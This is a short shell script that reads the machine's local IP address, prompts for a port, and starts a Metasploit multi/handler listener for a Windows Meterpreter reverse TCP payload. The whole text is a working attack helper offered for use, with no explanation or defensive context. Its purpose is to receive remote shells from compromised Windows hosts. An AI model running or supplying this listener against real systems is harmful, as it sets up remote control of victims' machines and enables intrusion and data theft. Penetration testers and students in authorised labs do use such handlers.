i=ifconfig

g=$($i | grep "inet " | grep -v "127" | sed 's/inet//g' | sed 's/  netmask 255.255.255.0  broadcast *.*.*.*//g')

echo "Enter the Local Port eg 443"
read varLPort

msfconsole -x "use multi/handler ;set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT $varLPort; set LHOST $g;run" 

